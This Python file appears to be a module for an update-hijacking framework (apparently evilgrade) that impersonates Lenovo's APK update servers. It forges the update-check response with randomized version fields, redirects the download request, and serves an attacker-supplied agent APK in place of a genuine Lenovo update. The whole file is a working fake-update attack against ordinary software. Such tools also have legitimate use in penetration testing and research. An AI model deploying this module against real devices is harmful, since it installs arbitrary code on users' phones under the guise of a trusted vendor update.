from modules import ModuleBase


class LenovoAPK(ModuleBase):
    name = 'lenovoapk'
    version = '1.0'
    appver = 'All'
    author = ['Matias Ariel Re Medina <mre[at]infobytesec[dot]com>']
    description = "Lenovo's APK Update",
    agent_filename = './agent/agent_stub.apk'
    vh = 'suslcs.lenovomm.com|susapi.lenovomm.com' 
    requests = [
        {   'path': '/adpserver/GetVIByPN',
            'type': 'string',
            'method': '',
            'bin': '0',
            'string' : """SUS-{
                        "SUSRESINFO": {
                            "ChannelKey":"null",
                            ,"VerCode":"<%RND5%>",
                            ,"VerName":"<%RND4%>.<%RND6%>.<%RND7%>",
                            ,"DownloadURL":"http://suslcs.lenovomm.com/*01*L2FkcEBjbHVzdGVyLTEvMTQ1MDY2NjQxMTk1NS9OTVAwNk1HODZYV0MvMjYvbnVsbC9NakhlaWJlaU4yMzZiX3NpZ25lZC5hcGt8LTF8MHww",
                            ,"Size":"<%AGENTSIZE%>",
                            ,"UpdateDesc":"1%E3%80%81%E4%BF%AE%E6%AD%A3%E9%83%A8%E5%88%86%E7%A8%8B%E5%BA%8F%E9%97%AE%E9%A2%98%0A2%E3%80%81%E4%BC%98%E5%8C%96%E7%B3%BB%E7%BB%9F%E8%B5%84%E6%BA%90%E4%BD%BF%E7%94%A8",
                            ,"FileName":"<%APKNAME%>.apk",
                            ,"CtrlKey":"0",
                            ,"RRules":"NO_RULES",
                            ,"CustKey":"null",
                            ,"PackageID":"<%RND3%>",
                            ,"RegionKey":"SEA",
                            ,"RES":"SUCCESS",
                            ,"FORMATTYPE":"FTYPE_1"
                            }
                        }""",
            'parse': '1',
            'file': '',
        },
        {   'path': '\*\d+\*\w+',
            'type': 'redirect',
            'location': 'http://suslcs.lenovomm.com/<%APKNAME%>.apk',
            'method': '',
            'bin': 1,
            'string': '',
            'parse': '1',
            'file': '',
        },
        {   'path': '.apk',
            'type': 'agent',
            'method': '',
            'bin': 1,
            'string': '',
            'parse': '0',
            'file': ''
        },
    ]
    options = {
        'apkname': {
            'val': 'LenovoApp_signed',
            'desc': 'App name.'
        },
        'rnd3': {
            'val': 'rand_num(5)',
            'hidden': 1,
            'dynamic': 1
        },
        'rnd4': {
            'val': 'rand_num(1)',
            'hidden': 1,
            'dynamic': 1
        },
        'rnd5': {
            'val': 'rand_num(2)',
            'hidden': 1,
            'dynamic': 1
        },
        'rnd6': {
            'val': 'rand_num(1)',
            'hidden': 1,
            'dynamic': 1
        },
        'rnd7': {
            'val': 'rand_num(1)',
            'hidden': 1,
            'dynamic': 1
        }
    }
